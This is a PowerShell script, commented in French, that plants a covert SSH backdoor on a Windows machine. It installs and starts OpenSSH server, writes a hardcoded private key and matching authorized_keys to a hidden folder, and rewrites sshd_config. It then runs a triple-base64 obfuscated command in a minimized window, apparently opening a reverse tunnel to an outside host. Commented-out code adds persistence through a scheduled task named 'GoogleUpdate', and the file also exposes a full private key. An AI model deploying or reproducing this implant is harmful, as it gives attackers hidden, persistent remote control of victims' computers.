#$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
#Register-ScheduledTask -Xml $xml -TaskName "GoogleUpdate" -User $currentUser -Force

#$sc = 
#@'
function installSshd 
{
    $status_install = Get-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
    $status_install = $status_install.State

    if ($status_install -match "NotPresent")
    {
        Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
        Start-Service -Name sshd
        Set-Service -Name sshd -StartupType Automatic
    }    
        
    if ($status_install -match "Installed")
    {
        if (!(Test-Path -Path "C:\Windows\System32\OpenSSH\sshd.exe") -or !(Test-Path -Path "C:\Windows\System32\OpenSSH\ssh.exe")) 
        {
            Remove-WindowsCapability -Name "OpenSSH.Server~~~~0.0.1.0" -Online
            Remove-WindowsCapability -Name "OpenSSH.Client~~~~0.0.1.0" -Online
            Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
            Add-WindowsCapability -Online -Name "OpenSSH.Client~~~~0.0.1.0"
            Set-Service -Name sshd -StartupType Automatic
        }
        $status_lanch = Get-Service -Name sshd
        $status_lanch = $status_lanch.Status

        if ($status_lanch -notmatch "Running")
        {
            Start-Service -Name sshd
            #Write-Host("Service Demarré")
        }
    }
}

$Global:contentDirectory = "$env:LOCALAPPDATA/content"
if(!(Test-Path -Path $Global:contentDirectory))
{
    New-Item -ItemType Directory -Path $Global:contentDirectory -Force
}

$privateKey = @"
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
"@

function createPrivateKeyOnRemote 
{
    #Creation cle privee sur pc distant avec utf8
    $privateKey | Out-File "$Global:contentDirectory/id_rsa" -Encoding utf8 -Force

    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    #Droit de la key uniquement pour l'utilisateur connecté
    $directory = "$Global:contentDirectory/id_rsa"
    $acl = Get-Acl $directory
    $acl.SetAccessRuleProtection($true,$false)
    $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("$currentUser","Read","Allow")
    $acl.SetAccessRule($AccessRule)
    $acl |Set-Acl
}

$pubKey = @"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJKYB7ZqIzEWhRUkkWPJtqNHN8sG95nvFdDN2K2hKVKEBR8caC+5gPlD3att6g9AuRYlR5fqYygIzmbXEqlb/7T2zb1T9gBKpNcixe++x3FhD7ViWTB2hgISSrZlsS7f0OEIbd0UQqvyQ9cqXwJ4G3+XoMjW/5Eo1nYZJzhcUsgGNglTRB2h9FzRNAcc1ayKlDEAM4c8LSDjGd4SZ03jKOne720rKGeYk/P+YqGqyPvYvDJpDQX77w/So+XA2yIN1uoLVLKeTaB+f/tHcuSeLheNzR40BGaegifg+QM4Wa72B98j0tOb1MTJ2MD7VGlnPQIPYGceLQWeC99iaXcgwWcbpTBf8ehKni0n/y0NNZM/Jtsgka+aRHpf9mxKeVOl7h3UrAvphyCrcxhnzDnl1jRBfsNsGGj5cZEiEx9vr37kqbzUkSOZITgwD34M2MYhOAOJvw7Nm0L88R2mDiFnOi8JtpOTsyEMDLU+VfXuK9/WxoTvHr+3IiJ34evlk5XnU= gunsa@DESKTOP-TV94KT0
"@

function createAuthorized_key #pour guest et admin
{
    $authorized_keys = "$Global:contentDirectory/authorized_keys"
    $administrators_authorized_keys = "$Global:contentDirectory/administrators_authorized_keys"
    $authorized_keys,$administrators_authorized_keys | ForEach-Object {
        if(!(Test-Path -Path $_))
        {
            New-Item -ItemType File -Path $_ -Value $pubKey -Force
        }

        #ajout des droit neccessaire pour le fonctionnement
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $acl = Get-Acl $_
        $acl.SetAccessRuleProtection($true,$false)
        $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("$currentUser","FullControl","Allow")
        $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule("SYSTEM","FullControl","Allow")
        $acl.SetAccessRule($AccessRule)
        $acl.SetAccessRule($systemRule)
        $acl |Set-Acl
    }
}

Function configSSHD_config
{ 
    $a = @"
AuthorizedKeysFile	$Global:contentDirectory/authorized_keys
PasswordAuthentication no
Subsystem	sftp	sftp-server.exe
Match Group administrators
AuthorizedKeysFile $Global:contentDirectory/administrators_authorized_keys"
"@
    #ajout autorisation de mofifier fichier
    $pathConfigSSHD = "C:\ProgramData\ssh\sshd_config"
    New-Item -ItemType File -Path $pathConfigSSHD -Value $a -Force
}

$C = 'WXpOT2IwbERNWFpKUTBwVVpFaEtjRmt6VWtsaU0wNHdVekpXTlZFeWFHeFpNblJ3WW0xaloySnRPR2xKUjJReFltNU9hRkZFYTNkTWFrVjNUMU0wZVUxNmEzVk5lazFuVEZaSlowNXFXVEpPYW5CellqSk9hR0pIYUhaak0xRTJUV3BKWjB4WGEyZEphVkpzWW01Wk5sUkZPVVJSVlhoQ1ZVWkNSVkZXVWtKTU1rNTJZbTVTYkdKdVVYWmhWMUptWTI1T2FFbG5QVDA9'

for ($i = 0; $i -lt 3; $i++) 
{ $C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C)) }

installSshd 
createPrivateKeyOnRemote 
createAuthorized_key
configSSHD_config


cmd /MIN /C $C

#'@ | Out-File -FilePath "$env:LOCALAPPDATA/content/SC.ps1" -Encoding utf8 -Force

<#
$xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-06-22T12:04:36.3993155</Date>
    <Author>DESKTOP-TV94KT0\gunsa</Author>
    <URI>\test</URI>
  </RegistrationInfo>
  <Triggers />
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-1218715442-157715563-3366828991-1001</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd</Command>
      <Arguments>/C /MIN powershell -F "$env:LOCALAPPDATA\content/SC.ps1"</Arguments>
    </Exec>
  </Actions>
</Task>
"@
#>